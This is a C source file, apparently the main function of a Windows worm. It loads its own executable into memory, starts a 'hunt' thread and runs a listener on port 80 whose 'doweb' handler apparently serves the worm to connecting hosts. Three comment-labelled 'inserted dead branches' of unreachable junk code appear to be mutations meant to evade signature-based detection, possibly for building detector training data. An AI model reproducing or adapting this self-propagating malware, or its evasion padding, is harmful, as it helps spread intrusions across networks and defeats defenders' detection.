#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>   // added for sprintf_s (Category B)

int main(int argc, char **argv, char **env) {
    WSADATA wsaData;
    SOCKET listen_sock, client_sock;
    SOCKADDR_IN server_addr, client_addr;
    int addr_len = sizeof(client_addr);
    HANDLE hFile;
    DWORD bytesread;
    DWORD threadId;

    // --- INSERTED DEAD BRANCH 1 (after declarations, Pattern A, Category A) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // System info queries (Category A)
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char username[256];
        DWORD userLen = sizeof(username);
        GetUserNameA(username, &userLen);
        char compname[256];
        DWORD compLen = sizeof(compname);
        GetComputerNameA(compname, &compLen);
        volatile unsigned long sum = 0;
        for (int k = 0; k < 5; k++) {
            sum += (si.dwNumberOfProcessors + st.wHour) ^ username[k % 10];
        }
        char dummyBuf[64];
        memset(dummyBuf, 0, sizeof(dummyBuf));
        (void)sum;
        (void)compname;
    }

    if (argc < 1) return 1;

    hFile = CreateFileA(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    _sizemybytes = GetFileSize(hFile, NULL);
    if (_sizemybytes == INVALID_FILE_SIZE) { CloseHandle(hFile); return 1; }

    _mybytes = (char *)malloc(_sizemybytes);
    if (!_mybytes) { CloseHandle(hFile); return 1; }

    if (!ReadFile(hFile, _mybytes, _sizemybytes, &bytesread, NULL) || bytesread != _sizemybytes) {
        free(_mybytes);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    // --- INSERTED DEAD BRANCH 2 (before WSAStartup, Pattern B, Category B) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Memory & String operations (Category B)
        const char *testStr = "pre-wsa";
        size_t len = strlen(testStr) + 16;
        char *buf = (char *)malloc(len);
        if (buf) {
            sprintf_s(buf, len, "STR:%s", testStr);
            volatile size_t l = strlen(buf);
            char *copy = (char *)malloc(l + 1);
            if (copy) {
                memcpy(copy, buf, l + 1);
                volatile int cmp = (copy[0] == 'S') ? 1 : 0;
                memset(copy, 0, l + 1);
                free(copy);
            }
            free(buf);
        }
        char dummy[64];
        sprintf_s(dummy, sizeof(dummy), "dead");
        memset(dummy, 0xAA, sizeof(dummy));
    }

    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
        free(_mybytes);
        return 1;
    }

    setuphostname();

    // Start hunting thread
    CreateThread(NULL, 0, hunt, NULL, 0, &threadId);

    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == INVALID_SOCKET) {
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(80);

    if (bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
        closesocket(listen_sock);
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    if (listen(listen_sock, 5) != 0) {
        closesocket(listen_sock);
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    // --- INSERTED DEAD BRANCH 3 (before while loop, Pattern C, Category C) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        // Bitwise/Math loops (Category C)
        volatile unsigned char arr[32];
        for (int j = 0; j < 32; j++) {
            arr[j] = (unsigned char)(j ^ 0x55);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int j = 0; j < 32; j++) {
            hash ^= arr[j];
            hash *= 0x01000193;
        }
        volatile unsigned int result = hash;
        for (int k = 0; k < 4; k++) {
            result = (result << 1) ^ (result >> 31);
        }
        char discard[16];
        memset(discard, (char)(result & 0xFF), sizeof(discard));
        (void)result;
    }

    while (TRUE) {
        client_sock = accept(listen_sock, (struct sockaddr *)&client_addr, &addr_len);
        if (client_sock == INVALID_SOCKET) continue;
        CreateThread(NULL, 0, doweb, &client_sock, 0, &threadId);
    }

    // Never reached
    closesocket(listen_sock);
    WSACleanup();
    free(_mybytes);
    return 0;
}
